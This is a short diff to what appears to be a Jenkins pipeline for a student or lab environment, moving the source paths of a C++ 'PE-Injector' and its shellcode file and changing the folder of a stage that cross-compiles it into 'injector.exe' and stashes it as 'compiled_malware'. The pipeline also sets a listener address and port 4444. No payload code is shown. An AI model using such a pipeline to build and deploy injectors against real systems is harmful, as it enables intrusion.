@@ -6,8 +6,8 @@ pipeline {
         LHOST = '100.85.95.64'
         LPORT = 4444
         HOSTNAME = 'student-virtual-machine'
-        MALWARE_PATH = 'Simple/PE-Injector/PE-Injector.cpp'
-        SHELLCODE_PATH = 'Simple/PE-Injector/base.cpp'
+        MALWARE_PATH = 'src/Simple/PE-Injector/PE-Injector.cpp'
+        SHELLCODE_PATH = 'src/Simple/PE-Injector/base.cpp'
         EXECUTABLE_NAME = 'injector.exe'
     }
 
@@ -53,7 +53,7 @@ pipeline {
         stage('Compile and Stash Malware') {
             agent { label 'linux' }
             steps {
-                dir('scripts/src') {
+                dir('scripts') {
                     sh 'x86_64-w64-mingw32-g++ -std=c++17 -static -o $EXECUTABLE_NAME $MALWARE_PATH -lpsapi'
                     stash includes: "$EXECUTABLE_NAME", name: 'compiled_malware'
                 }
